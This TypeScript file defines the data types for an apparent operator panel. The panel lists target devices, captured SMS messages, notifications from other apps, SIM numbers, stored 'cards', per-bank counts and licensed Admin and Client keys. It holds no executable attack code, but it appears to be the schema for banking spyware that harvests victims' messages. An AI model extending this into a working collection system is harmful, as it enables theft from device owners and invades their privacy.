export interface User {
  key: string;
  androidId: string;
  isBlocked: boolean;
  expirationTime: string;
  userId: string;
  userType?: string; // 'Admin' | 'Client'
  keyType?: 'WEB' | 'APP'; // Authentication role type
  keyChangeCount?: number;
}

export interface DeviceInfo {
  userId: string; // The key from firebase
  Brand: string;
  DeviceId: string;
  Status: "Online" | "Offline";
  checked?: boolean;
  lastSeen?: number;
  timestamp?: number;
  // Merged fields for UI
  sim1Number?: string;
  sim2Number?: string;
}

export interface SimDetails {
  sim1Number?: string;
  sim2Number?: string;
  sim1Provider?: string;
  sim2Provider?: string;
}

export interface UserFullInfo {
  info?: any;
  cards?: any;
  deviceInfo?: DeviceInfo;
  simDetails?: SimDetails;
  [key: string]: any; 
}

export interface SMS {
  key: string;
  sender: string;
  body: string;
  timestamp: number;
  receivedDate: string;
  userId: string;
  androidId?: string;
}

export interface Message {
  key: string;
  deviceId: string;
  package: string;
  title: string;
  text: string;
  subText?: string;
  timestamp: number;
  formattedTime?: string;
}

export interface BankStats {
  name: string;
  count: number;
}

export interface Notification {
  id: string;
  type: 'SYSTEM' | 'KEY_CHANGE' | 'EXPIRY_WARNING' | 'INFO';
  title: string;
  message?: string; // Legacy or banner node
  text?: string; // Main node notifications field
  timestamp: number;
  userId?: string;
  read?: boolean;
  priority?: 'normal' | 'high';
  action?: string;
  action_link?: string;
}

export type Screen = 'LOGIN' | 'HOME' | 'SMS_VIEW' | 'DATA_VIEW' | 'GLOBAL_SMS' | 'GLOBAL_DATA' | 'BANK_SUMMARY' | 'NOTIFICATIONS' | 'FAVORITES' | 'MESSAGES';

export interface AppState {
  user: User | null; // The logged in admin/client
  currentScreen: Screen;
  selectedTargetUser: DeviceInfo | null; // The user selected from the list
}